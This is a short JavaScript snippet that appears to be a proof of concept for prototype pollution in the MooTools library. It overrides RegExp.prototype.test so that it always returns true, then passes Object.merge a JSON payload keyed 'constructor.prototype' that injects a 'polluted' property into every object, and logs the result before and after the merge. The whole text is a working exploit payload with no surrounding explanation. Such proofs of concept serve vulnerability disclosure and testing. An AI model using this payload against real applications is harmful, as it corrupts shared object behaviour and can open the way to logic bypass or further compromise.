RegExp.prototype.test = () => true;
require('mootools');
console.log({}.polluted);
Object.merge({}, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);